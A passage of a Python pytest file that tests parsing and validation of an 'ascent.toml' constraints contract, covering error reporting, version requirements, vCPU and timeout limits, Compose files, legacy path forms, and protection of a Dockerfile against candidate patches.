        section: The section the error must name, or None.
        key: The key the error must name, or None.
    """
    with pytest.raises(ConstraintsError) as caught:
        parse_constraints(raw)
    assert (caught.value.section, caught.value.key) == (section, key)


def test_an_mcp_file_error_names_the_role_mcp_setting(tmp_path: Path) -> None:
    """A bad server in an .mcp.json file points to the role's mcp setting, the place to fix in the toml.

    Args:
        tmp_path: Pytest's temporary folder.
    """
    with pytest.raises(ConstraintsError, match="server 'm' needs a url") as caught:
        _read_mcp(tmp_path, run=b'{"mcpServers": {"m": {"type": "http"}}}')
    assert (caught.value.section, caught.value.key) == ("run", "mcp")


def test_a_constraints_error_keeps_its_section_and_key_through_pickle() -> None:
    """The section and key survive a pickle round trip, so a worker can pass the error on (SKY-184)."""
    error = ConstraintsError("[run] entry is missing", section="run", key="entry")

    copy = pickle.loads(pickle.dumps(error))

    assert (str(copy), copy.section, copy.key) == ("[run] entry is missing", "run", "entry")


@pytest.mark.parametrize("raw", [b"", b"[paths]\neditable = ['src']\n", b'instructions = "docs/intent.md"\n'])
def test_a_file_without_a_version_fails_and_shows_the_fix(raw: bytes) -> None:
    """``version`` is required, so an empty file fails too, and the error shows ``version = 1`` (SKY-690).

    Args:
        raw: The ``ascent.toml`` bytes, with no ``version``.
    """
    with pytest.raises(ConstraintsError, match=r"version is missing\. Put version = 1 at the top") as caught:
        parse_constraints(raw)
    assert (caught.value.section, caught.value.key) == (None, "version")


def test_a_started_run_reads_a_missing_version_as_version_1() -> None:
    """A run that started before ``version`` was required still parses its pinned commit's file (SKY-690)."""
    raw = b'[paths]\neditable = ["src"]\n[run]\nentry = "run.py:main"\n'

    lenient = parse_constraints(raw, require_version=False)

    assert replace(lenient, sha256="") == replace(parse_constraints(b"version = 1\n" + raw), sha256="")
    with pytest.raises(ConstraintsError, match="version is missing"):
        parse_constraints(raw)


def test_the_public_names_are_the_package_objects() -> None:
    """The module re-exports the package names, so a check outside Skynet and Skynet agree (SKY-760)."""
    for name in repo_constraints.__all__:
        if name not in ("CONSTRAINTS_REQUIRED", "parse_constraints", "read_constraints"):
            assert getattr(repo_constraints, name) is getattr(contract, name), name
    assert ConstraintsError is contract.ConstraintsError
    assert repo_constraints.CONSTRAINTS_REQUIRED.startswith("The run needs an ascent.toml contract.")


@pytest.mark.parametrize("vcpus", [1, 2, 32])
def test_a_vcpu_count_up_to_the_vercel_cap_parses(vcpus: int) -> None:
    """Skynet's cap is the Vercel Sandbox vCPU cap (SKY-760).

    Args:
        vcpus: A vCPU count up to the cap.
    """
    raw = f'version = 1\n[run]\nentry = "run.py:main"\nvcpus = {vcpus}\n'.encode()

    assert parse_constraints(raw).run_vcpus == vcpus


@pytest.mark.parametrize("vcpus", [3, 34])
def test_a_vcpu_count_over_the_cap_or_odd_fails_with_the_cap(vcpus: int) -> None:
    """A count that no Vercel Sandbox has fails and names the allowed counts (SKY-760).

    Args:
        vcpus: A vCPU count over the cap, or an odd count.
    """
    raw = f'version = 1\n[run]\nentry = "run.py:main"\nvcpus = {vcpus}\n'.encode()

    with pytest.raises(ConstraintsError, match=r"vcpus must be 1 or an even number from 2 to 32") as caught:
        parse_constraints(raw)
    assert (caught.value.section, caught.value.key) == ("run", "vcpus")


def test_a_long_timeout_parses_because_skynet_sets_no_maximum() -> None:
    """The scorer's supervisor enforces each timeout, so the contract has no upper limit (SKY-635)."""
    raw = b'version = 1\n[run]\nentry = "run.py:main"\ntimeout = 86400\n'

    assert parse_constraints(raw).run_timeout == 86400


_COMPOSE = b"services:\n  db:\n    image: postgres:16\n    command: postgres -D /data\n"


def test_the_compose_file_fills_the_compose_services(tmp_path: Path) -> None:
    """``read_constraints`` reads the ``[sandbox] compose`` file with Skynet's Compose parser (SKY-760).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    raw = b'version = 1\n[run]\nentry = "run.py:main"\n[sandbox]\ncompose = "compose.yaml"\n'

    constraints = _read(tmp_path, raw, {"compose.yaml": _COMPOSE})

    assert constraints is not None
    assert constraints.compose_file == "compose.yaml"
    assert [(service.name, service.command) for service in constraints.compose_services] == [
        ("db", "postgres -D /data")
    ]


def test_a_bad_compose_file_fails_at_the_sandbox_compose_setting(tmp_path: Path) -> None:
    """A Compose error from Skynet's parser becomes a ConstraintsError at ``[sandbox] compose`` (SKY-760).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    raw = b'version = 1\n[run]\nentry = "run.py:main"\n[sandbox]\ncompose = "compose.yaml"\n'

    with pytest.raises(ConstraintsError, match=r"\[sandbox\] compose names 'compose.yaml': .*'services'") as caught:
        _read(tmp_path, raw, {"compose.yaml": b"version: '3'\n"})
    assert (caught.value.section, caught.value.key) == ("sandbox", "compose")


# Skynet's older reader accepted spaces and a "/" at the end of a path; the package refuses them in a new check.
_LEGACY = b'version = 1\n[run]\nentry = "run.py:main"\n[metric]\nfiles = [" scoring/ "]\n'


def test_a_new_check_refuses_an_older_form() -> None:
    """A new check keeps the strict forms of the package parser (SKY-760)."""
    with pytest.raises(ConstraintsError, match=r"must be written 'scoring'") as caught:
        parse_constraints(_LEGACY)
    assert (caught.value.section, caught.value.key) == ("metric", "files")


def test_the_wrappers_pass_legacy_forms_to_the_package(tmp_path: Path) -> None:
    """``legacy_forms=True`` reads the older forms as the older reader did, in both wrappers (SKY-760).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    assert parse_constraints(_LEGACY, legacy_forms=True).metric.files == ("scoring",)
    constraints = read_constraints(_archive(tmp_path, {CONSTRAINTS_FILE: _LEGACY}), legacy_forms=True)
    assert constraints is not None
    assert constraints.metric.files == ("scoring",)
    with pytest.raises(ConstraintsError, match=r"must be written 'scoring'"):
        read_constraints(_archive(tmp_path, {CONSTRAINTS_FILE: _LEGACY}))


def test_a_legacy_network_entry_must_still_name_a_public_host() -> None:
    """Under ``legacy_forms`` a private host still fails, because the list comes from the repository (SKY-760)."""
    raw = b'version = 1\n[run]\nentry = "run.py:main"\nnetwork = ["localhost"]\n'

    with pytest.raises(ConstraintsError, match="localhost"):
        parse_constraints(raw, legacy_forms=True)


def test_a_started_hardening_pass_rereads_the_older_forms(tmp_path: Path) -> None:
    """The trusted tree of a started pass reads as its staging did; a new pass stays strict (SKY-760).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    (tmp_path / CONSTRAINTS_FILE).write_bytes(_LEGACY)

    started = hardening_runner._trusted_constraints(tmp_path, require_version=False)

    assert started is not None
    assert started.metric.files == ("scoring",)
    with pytest.raises(ConstraintsError, match=r"must be written 'scoring'"):
        hardening_runner._trusted_constraints(tmp_path, require_version=True)


def _edit(path: str) -> str:
    """Write a one-line ``git diff`` of ``path``.

    Args:
        path: The edited file.

    Returns:
        The patch.
    """
    return f"diff --git a/{path} b/{path}\n--- a/{path}\n+++ b/{path}\n@@ -1 +1 @@\n-a\n+b\n"


def test_a_candidate_cannot_edit_the_dockerfile_or_its_context(tmp_path: Path) -> None:
    """The Dockerfile and its protected folder refuse a candidate patch; other code stays editable (SKY-737).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    constraints = _read(
        tmp_path,
        b'version = 1\n[paths]\neditable = ["bot"]\nprotected = ["bot/box"]\n\n'
        b'[run]\nentry = "bot/app.py:main"\ndockerfile = "bot/box/Dockerfile"\n',
        {"bot/app.py": b"", "bot/box/Dockerfile": b"FROM python:3.12\n", "bot/box/requirements.txt": b"x\n"},
    )
    assert constraints is not None

    environment = effective_environment(constraints, approved_editable=["."], approved_setup=None)

    assert constraints.run_role.dockerfile == "bot/box/Dockerfile"
    assert "bot/box/Dockerfile" in environment.protected_paths
    for path in ("bot/box/Dockerfile", "bot/box/requirements.txt"):
        assert patch_violations(_edit(path), environment.editable_paths, (), environment.protected_paths)
    assert not patch_violations(_edit("bot/app.py"), environment.editable_paths, (), environment.protected_paths)


def test_a_dockerfile_context_that_a_version_can_edit_is_refused(tmp_path: Path) -> None:
    """An editable path inside the build context fails the parse, so no image builds from edited files (SKY-737).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    with pytest.raises(ConstraintsError, match="build context"):
        _read(
            tmp_path,
            b'version = 1\n[paths]\neditable = ["bot"]\n\n[run]\nentry = "bot/app.py:main"\ndockerfile = "bot/Dockerfile"\n',
            {"bot/app.py": b"", "bot/Dockerfile": b"FROM python:3.12\n"},
        )
